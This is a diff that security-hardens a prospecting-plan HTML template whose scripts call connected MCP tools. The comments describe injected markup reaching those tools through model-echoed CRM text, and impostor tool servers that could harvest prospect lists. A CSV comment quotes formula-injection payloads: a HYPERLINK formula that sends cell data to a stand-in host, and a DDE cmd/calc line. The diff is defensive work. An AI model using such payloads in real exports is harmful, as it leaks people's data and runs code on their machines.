@@ -3,6 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- This document holds callMcpTool, so injected markup here is not a defacement
+     but a route to a connected tool. The policy below is deliberately partial:
+     no default-src, because the cowork bridge's transport is host-defined and a
+     blanket connect-src would silently kill every reveal. What it does buy is the
+     two channels injected markup would actually reach for -- a remote <script>
+     and an <img> beacon carrying the board off-origin. Inline script and style
+     stay allowed because the whole template is one file. -->
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; object-src 'none'; base-uri 'none'; form-action 'none'">
 <title>My Plan</title>
 <style>
   :root{ color-scheme: light;
@@ -461,6 +469,26 @@ function escHtml(value){
     .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
     .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
+/* `glance` and `mail.b` are the only two fields the data contract lets the agent
+   author as markup, and the contract's allowance is narrow: <b> and <br>, no
+   other tags, no attributes. Escape everything, then re-admit exactly those two
+   -- an allowlist, so a hostile CRM field or community message that the model
+   echoed into either one cannot open a tag it was not granted. Never widen this
+   to a blocklist; the fields it guards share a document with callMcpTool. */
+function escRich(value){
+  return escHtml(value)
+    .replace(/&lt;(\/?)b&gt;/gi, '<$1b>')
+    .replace(/&lt;br\s*\/?&gt;/gi, '<br>');
+}
+/* The redaction floor for every diagnostic in this file: shapes, never values.
+   Key names tell you which parser branch missed; the values behind them are a
+   person's email and phone number. Log the former, never the latter. */
+function fieldNames(value){
+  if (value == null) return [];
+  if (Array.isArray(value)) return ['[array:' + value.length + ']'];
+  if (typeof value !== 'object') return ['[' + typeof value + ']'];
+  return Object.keys(value);
+}
 function isPlaceholder(value){ return /^__[A-Z_]+__$/.test(String(value || '')); }
 function clean(list){ return (Array.isArray(list) ? list : []).filter(function(v){ return !isPlaceholder(v); }); }
 
@@ -601,17 +629,26 @@ function ToolUnavailable(shortName){
 }
 ToolUnavailable.prototype = Object.create(Error.prototype);
 
+/* Exact identity, or nothing. This used to fall back to scanning the ambient
+   tool list for any name ending in the short name, to survive a connector id
+   that went stale between renders. That fallback trusted the wrong thing: the
+   short names are guessable, so any other server in the workspace -- installed
+   for unrelated reasons, or hostile -- could register `<anything>__contact_data_
+   enrichment` and be handed a rep's prospect list, or answer with forged
+   enrichment. A stale id is a render-time problem with a render-time fix (the
+   plan is rebuilt weekly); a substituted impostor is not recoverable.
+   So: only what the agent explicitly wrote into TOOLS, and only if it still
+   looks like the tool it claims to be -- a mis-pasted id fails closed too.
+   Failing closed is already a designed state: the affected control renders
+   disabled with "Not connected here -- ask in chat." */
 function resolveTool(shortName){
   var injected = TOOLS[shortName];
-  if (injected && !isPlaceholder(injected)) return injected;
-  var listed = (window.cowork && typeof window.cowork.listMcpTools === 'function')
-    ? (window.cowork.listMcpTools() || []) : [];
-  for (var i = 0; i < listed.length; i++) {
-    if (typeof listed[i] === 'string' && listed[i].indexOf('__' + shortName) === listed[i].length - shortName.length - 2) {
-      return listed[i];
-    }
-  }
-  return null;
+  if (!injected || isPlaceholder(injected)) return null;
+  var id = String(injected);
+  var tail = '__' + shortName;
+  var at = id.lastIndexOf(tail);
+  var qualified = at >= 0 && at + tail.length === id.length;
+  return (id === shortName || qualified) ? id : null;
 }
 function toolAvailable(shortName){ return resolveTool(shortName) !== null; }
 
@@ -844,7 +881,7 @@ function accountCard(account, ai){
         '<div class="bar"><i style="width:' + account.fit + '%"></i></div>' +
         '<div class="hint">why this score</div></button>' +
     '</div>' +
-    (account.glance ? '<div class="glance">' + account.glance + '</div>' : '') +
+    (account.glance ? '<div class="glance">' + escRich(account.glance) + '</div>' : '') +
     '<div class="scoredims" id="sd-' + escHtml(account.id) + '">' + dimRows + '</div>' +
     (account.layers.length ? '<div class="chips"><span class="lbl">Signals</span>' +
       account.layers.map(function(s){ return '<span class="chip layer">' + escHtml(s) + '</span>'; }).join('') + '</div>' : '') +
@@ -978,7 +1015,7 @@ function openProspect(ai, pi){
       '<div class="sec-h">Drafted first touch</div>' +
       '<div class="m-mail"><div class="eh">Grounded in the signal above — edit before sending</div>' +
       '<div class="subj">Subject: ' + escHtml(person.mail.s) + '</div>' +
-      '<div>' + person.mail.b + '<br><br>Best,<br>[Your name]</div></div>' : '') +
+      '<div>' + escRich(person.mail.b) + '<br><br>Best,<br>[Your name]</div></div>' : '') +
     (TOUCHES.length ? '<div class="sec-h">Touchpoint plan</div>' +
       TOUCHES.map(function(t, i){ return '<div class="pt">Touch ' + (i + 1) + ': ' + escHtml(t) + '</div>'; }).join('') : '') +
     '<div class="err" id="err-p-' + ai + '-' + pi + '"></div>' +
@@ -1049,10 +1086,13 @@ async function revealContact(ai, pi){
 
   /* A miss is the case worth being able to debug later: the tool answers for
      this profile from chat, so an empty read here is either a provider miss
-     or a shape this parser does not recognise. The raw payload is the only
-     thing that tells those apart after the fact. */
+     or a shape this parser does not recognise. Logging the payload told those
+     apart -- and put emails, phones and profile ids into a console the rep
+     does not know is recording. The field names separate the two cases just as
+     well, and carry no personal data: a provider miss returns the keys with
+     empty values, an unrecognised shape returns keys this parser never reads. */
   if (!found) console.log('contact_data_enrichment returned no contact values',
-    { person: person.li, raw: result, parsedRow: row });
+    { person: person.li, responseFields: fieldNames(row), rowPresent: !!row });
 
   var emailEl = document.getElementById('em-' + ai + '-' + pi);
   var phoneEl = document.getElementById('ph-' + ai + '-' + pi);
@@ -1169,7 +1209,7 @@ async function openRevealAll(ai){
       'We could not confirm the cost for that many people. Reveal them individually, or ask in chat.',
       false);
     cost.textContent = '';
-    console.log('unexpected consent response', consent);
+    console.log('unexpected consent response', { responseFields: fieldNames(consent) });
     return;
   }
   cost.textContent = message;
@@ -1241,10 +1281,13 @@ async function confirmRevealAll(){
      an all-miss arrives fully matched and falls through to the loop below as
      the miss it is. Reaching here with rows present means the shape changed,
      which is worth refusing rather than guessing at. */
-  var rowCount = payloads.reduce(function(n, p){ return n + rowsOf(p).length; }, 0);
+  var allRows = payloads.reduce(function(acc, p){ return acc.concat(rowsOf(p)); }, []);
+  var rowCount = allRows.length;
   if (rowCount && !Object.keys(byUrl).length) {
+    /* The shape is the whole diagnosis here, and the shape is the key names --
+       the values in these rows are the emails and phones we just paid for. */
     console.log('bulk reveal returned rows that could not be matched by profile URL',
-      { raw: payloads });
+      { rowCount: rowCount, rowFields: fieldNames(allRows[0]) });
     showError('err-confirm',
       'That came back in a shape we could not match to these people. Nothing was changed — ' +
       'reveal them individually, or ask in chat.', false);
@@ -1376,8 +1419,25 @@ async function removeProspect(ai, pi){
   render();
 }
 
+/* Quoting makes a cell parse correctly; it does nothing about a cell Excel
+   decides is code. Every value here came from a prospect profile, a community
+   message or a model draft, so a name of `=HYPERLINK("http://x/?"&A1)` is a
+   live formula the moment a rep double-clicks the download -- quoted or not.
+   CSV has no type system, so the leading apostrophe is the only lever (the
+   xlsx path forces a string type instead -- see pg_plan_builder._write_cell).
+
+   `=` always gets the apostrophe. The other three introducers only get it when
+   the value could actually name something -- because `+15551234567` is what
+   every revealed phone number looks like, and blanket-prefixing turns the most
+   used column in this export into `'+15551234567` on every row. Without a
+   letter there is no function to call and no sheet to reference, and without
+   = ! : & " there is no way to build one, so `+1 (555) 555-0123` is inert on
+   its face while `@SUM(A1)` and `-cmd|' /C calc'!A0` still get neutralised.
+   Tab and CR go regardless: they re-split the row on some importers. */
 function csvCell(value){
-  var s = value == null ? '' : String(value);
+  var s = (value == null ? '' : String(value)).replace(/[\t\r]/g, ' ');
+  var namesSomething = /[A-Za-z=!:&"]/.test(s);
+  if (/^=/.test(s) || (/^[+\-@]/.test(s) && namesSomething)) s = "'" + s;
   return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
 }
 function downloadCsv(){
